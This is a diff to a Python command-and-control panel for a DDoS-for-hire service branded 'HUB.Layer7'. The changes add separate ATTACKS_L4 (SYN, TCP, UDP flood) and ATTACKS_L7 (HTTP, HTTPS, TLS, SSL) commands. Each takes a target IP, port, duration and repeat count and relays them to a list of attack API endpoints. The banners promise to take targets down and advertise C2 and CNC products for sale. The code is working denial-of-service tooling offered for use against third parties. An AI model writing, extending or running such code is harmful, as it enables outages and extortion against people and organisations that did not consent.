@@ -101,13 +101,14 @@ banner_layer7 = f'''
 {fg(201)}           ,MMMMMMN888UU[[/;::-. o@^       ║  ━ ═ ━ ═ ━ WELCOME TO HUB.Layer7 ━ ═ ━ ═ ━  ║        |.o '.|
 {fg(207)}           NNMMMNN888UU[[[/~.o@P^          ╚═════════════════════════════════════════════╝        |'._.'|
 {fg(206)}           888888888UU[[[/o@^-..            ╔════════╗ ╔════════╗  ╔═════════╗ ╔════════╗         |     |
-{fg(205)}          oI8888UU[[[/o@P^:--..             ║  HTTP  ║ ║   SSH  ║  ║  HTTPS  ║ ║ XXXXXX ║       ,'|  |  |`.
+{fg(205)}          oI8888UU[[[/o@P^:--..             ║  HTTP  ║ ║   SSH  ║  ║  HTTPS  ║ ║   TLS  ║       ,'|  |  |`.
 {fg(204)}       .@^  YUU[[[/o@^;::---..              ╚════════╝ ╚════════╝  ╚═════════╝ ╚════════╝      /  |  |  |  \\
-{fg(203)}     oMP     ^/o@P^;:::---..               ╔═════════════════════════════════════════════╗     |,-'--|--'-.|
-{fg(202)}  .dMMM    .o@^ ^;::---...                 ║ ━ ═ ━ ═ ━ MADE BY IDKHEX1629#3051 ━ ═ ━ ═ ━ ║ 
-{fg(208)} dMMMMMMM@^`       `^^^^                   ╚═════════════════════════════════════════════╝
-{fg(209)}YMMMUP^
-{fg(210)} ^^'''
+{fg(203)}     oMP     ^/o@P^;:::---..                ╔════════╗ ╔════════╗  ╔═════════╗ ╔════════╗      |,-'--|--'-.|
+{fg(202)}  .dMMM    .o@^ ^;::---...                  ║  SSL   ║ ║ XXXXXX ║  ║ XXXXXXX ║ ║ XXXXXX ║
+{fg(208)} dMMMMMMM@^`       `^^^^                    ╚════════╝ ╚════════╝  ╚═════════╝ ╚════════╝
+{fg(209)}YMMMUP^                                    ╔═════════════════════════════════════════════╗
+{fg(210)} ^^                                        ║ ━ ═ ━ ═ ━ MADE BY IDKHEX1629#3051 ━ ═ ━ ═ ━ ║
+{fg(211)}                                           ╚═════════════════════════════════════════════╝'''
 
 banner_layer4 = f'''
 {fg(70)}                     .::.  ╔══════════════════════════════════════════════════════════╗═╗
@@ -115,9 +116,9 @@ banner_layer4 = f'''
 {fg(72)}        ,MMM8&&&.:'   .:'  ╠═══╦═════════╦════════════════════════════════════════════╣ ║
 {fg(73)}       MMMMM88&&&&  .:'    ║ 1 ║   SYN   ║ Make the target down ( small target )      ║ ║
 {fg(74)}      MMMMM88&&&&&&:'      ╠═══╬═════════╬════════════════════════════════════════════╣ ║
-{fg(75)}      MMMMM88&&&&&&        ║ 2 ║   ADS   ║ FREE SRC 100K RPS CONTACT HEX1629 GITHUB   ║ ║
+{fg(75)}      MMMMM88&&&&&&        ║ 2 ║   TCP   ║ Transmission Control Protocol flood packet ║ ║
 {fg(45)}    .:MMMMM88&&&&&&        ╠═══╬═════════╬════════════════════════════════════════════╣ ║
-{fg(44)}  .:'  MMMMM88&&&&         ║ 3 ║   ADS   ║ BUY LuciferV2 CNC --> HuynhNhatToan#1137   ║ ║
+{fg(44)}  .:'  MMMMM88&&&&         ║ 3 ║   UDP   ║ User Datagram Protocol flood packet        ║ ║
 {fg(43)}.:'   .:'MMM8&&&'          ╠═══╬═════════╬════════════════════════════════════════════╣ ║
 {fg(42)}:'  .:'                    ║ 4 ║   ADS   ║ BUY Fancy C2 --> HuynhNhatToan#1137        ║ ║
 {fg(41)}'::'                       ╠═══╩═════════╩════════════════════════════════════════════╣ ║
@@ -402,9 +403,9 @@ class CLIENT_BUILDER():
                     LIST_LOGIN.remove(f'{user}:{password}')
                 else:
                    CLIENT_BUILDER.SEND(socks,f'{fg(196)}UNREGISTER {fg(197)}<USER> {fg(198)}<PASSWORD>')
-             elif COM == 'ATTACKS':
+             elif COM == 'ATTACKS_L4':
                 if len(command) == 6:
-                 methods = ["SYN","SSH","HTTP",'HTTPS'] 
+                 methods = ["SYN",'TCP','UDP'] 
                  code = 0
                  ip_tar = command[1]
                  port = command[2]
@@ -417,20 +418,66 @@ class CLIENT_BUILDER():
                        time.sleep(0.1)
                     code = 1
                  if code == 1:
-                  api_list = CHECKING.API_ONLINE
-                  api = '/TARGET=IP&PORT=NUM&TIME=SEC&TYPE=METHODS2_HEX1629'
-                  api2 = api.replace('IP',ip_tar).replace('NUM',port).replace('SEC',sec).replace('HTTP',method).replace('METHODS2',method)
-                  if len(api_list) != 0:
-                    for _ in range(int(spam_api)):
+                   api_list = CHECKING.API_ONLINE
+                   apiv1 = '/TARGET=IP&PORT=NUM&TIME=SEC&TYPE=METHODS2_HEX1629'
+                   api1 = apiv1.replace('IP',ip_tar).replace('NUM',port).replace('SEC',sec).replace('METHODS2',method)
+                   apiv2 = '/TARGET2=IP&PORT=NUM&TIME=SEC&TYPE=METHODS2_HEX1629'
+                   api2 = apiv2.replace('IP',ip_tar).replace('NUM',port).replace('SEC',sec).replace('METHODS2',method)
+                   if len(api_list) != 0:
+                     for _ in range(int(spam_api)):
                        for url_api in api_list:
                         if CHECKING.time_out_setting != 0:
-                         r = requests.get(f'{url_api}{api2}', timeout=CHECKING.time_out_setting)
+                         r = requests.get(f'{url_api}{api1}', timeout=CHECKING.time_out_setting)
                         else:
-                         r = requests.get(f'{url_api}{api2}')
+                         r = requests.get(f'{url_api}{api1}')
+                        if '<title>400 PAGE</title>' in r.content.decode(): # FOR NOT SUPPORT
+                         if CHECKING.time_out_setting != 0:
+                          r = requests.get(f'{url_api}{api1}', timeout=CHECKING.time_out_setting)
+                         else:
+                          r = requests.get(f'{url_api}{api1}')
                  else:
                     CLIENT_BUILDER.SEND(socks,f'{fg(196)}METHODS NOT FOUND')
                 else:
-                   CLIENT_BUILDER.SEND(socks, f"{fg(196)}ATTACKS <IP> <PORT> <TIME> <SPAM_API> <METHODS>\r\n{fg(197)}METHODS CHOOSE SSH HTTP HTTPS or SYN")
+                   CLIENT_BUILDER.SEND(socks, f"{fg(196)}ATTACKS_L4 <IP> <PORT> <TIME> <SPAM_API> <METHODS>\r\n{fg(197)}METHODS CHOOSE TCP UDP OR SYN")
+             elif COM == 'ATTACKS_L7':
+                if len(command) == 7:
+                 methods = ['HTTP','HTTPS','TLS','SSL'] 
+                 code = 0
+                 ip_tar = command[1]
+                 port = command[2]
+                 sec = command[3]
+                 spam_api = command[4]
+                 method_got = command[5]
+                 method = command[6]
+                 if method in methods:
+                    for x in banner_attack.split('\n'):
+                       CLIENT_BUILDER.SEND(socks,x.replace('TARGET',ip_tar).replace('NUMBER',port).replace('NAME',f"{method}_HEX1629").replace('WAIT',f'ATTACK --> {len(CHECKING.API_ONLINE)}'))
+                       time.sleep(0.1)
+                    code = 1
+                 if code == 1:
+                   api_list = CHECKING.API_ONLINE
+                   apiv1 = '/TARGET=IP&PORT=NUM&TIME=SEC&TYPE=METHODS2_HEX1629'
+                   api1 = apiv1.replace('IP',ip_tar).replace('NUM',port).replace('SEC',sec).replace('METHODS2',method)
+                   apiv2 = '/TARGET=IP&PORT=NUM&TIME=SEC&PACKET=HTTP&TYPE=METHODS2_HEX1629'
+                   api2 = apiv2.replace('IP',ip_tar).replace('NUM',port).replace('SEC',sec).replace('HTTP',method_got).replace('METHODS2',method)
+                   if len(api_list) != 0:
+                     for _ in range(int(spam_api)):
+                       for url_api in api_list:
+                        if CHECKING.time_out_setting != 0:
+                         r = requests.get(f'{url_api}{api1}', timeout=CHECKING.time_out_setting)
+                        else:
+                         r = requests.get(f'{url_api}{api1}')
+                        if '<title>400 PAGE</title>' in r.content.decode(): # FOR NOT SUPPORT
+                          if CHECKING.time_out_setting != 0:
+                           r = requests.get(f'{url_api}{api2}', timeout=CHECKING.time_out_setting)
+                          else:
+                           r = requests.get(f'{url_api}{api2}')
+                 else:
+                    CLIENT_BUILDER.SEND(socks,f'{fg(196)}METHODS NOT FOUND')
+                else:
+                   CLIENT_BUILDER.SEND(socks, f"{fg(196)}ATTACKS_L7 <IP> <PORT> <TIME> <SPAM_API> <HTTP> <METHODS>\r\n{fg(197)}METHODS CHOOSE HTTP HTTPS TLS OR SSL")
+             elif COM == 'ATTACKS':
+                CLIENT_BUILDER.SEND(socks, f"{fg(196)}ATTACK COMMAND --> L7 USE ATTACKS_L7 L4 USE ATTACKS_L4")
              CLIENT_BUILDER.SEND(socks, prompt, False)
         except:
            pass
